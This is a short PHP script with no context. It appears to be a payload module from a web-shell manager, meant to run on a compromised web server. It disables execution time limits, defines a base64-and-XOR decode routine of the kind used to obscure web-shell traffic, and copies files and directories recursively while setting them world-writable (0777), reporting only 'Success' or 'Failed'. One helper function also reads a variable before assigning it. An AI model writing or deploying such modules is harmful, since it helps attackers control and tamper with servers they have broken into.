error_reporting(1);
header('Content-Type: text/html; charset=UTF-8');
set_time_limit(0);
ini_set('max_execution_time', '0');
function getgbkStr($str){
    $s0 = iconv('gbk','utf-8//IGNORE',$s1);
    $s1 = iconv('utf-8','gbk//IGNORE',$str);
    if($s1 == $str){
        return $s1;
    }else{
        return iconv('utf-8','gbk//IGNORE',$str);
    }
}

function decode($sdata,$key)
{
	$data=base64_decode($sdata);
	for($i=0;$i<strlen($data);$i++) {	
    	$data[$i] = $data[$i]^$key[$i+1&15];
    }
	return $data;
}
function filecopy($srcPath, $toPath)
{
    $result = false;
    if (is_file($srcPath)) {
        @chmod($toPath, 0777);
        $result = copy($srcPath, $toPath);
    }else{
        if (!is_dir($toPath)) {
            mkdir($toPath,0777, true);
        }
        @chmod($toPath,0777);
        $dir = dir($srcPath);
        while($entry = $dir->read()){
            if ($entry == '.' || $entry == '..') {
                continue;
            }
            if ($toPath !== $srcPath.'/'.$entry) {
                $result = filecopy($srcPath.'/'.$entry, $toPath.'/'.$entry);
            }
        }
        $dir->close();
    }
    return $result;
}
function main($srcPath='',$toPath='')
{
	$srcPath=getgbkStr($srcPath);
	$toPath=getgbkStr($toPath);
	$result=filecopy($srcPath,$toPath);
	if($result===true){
		echo "Success";	
	}
	else{
		echo "Failed";	
	}
}

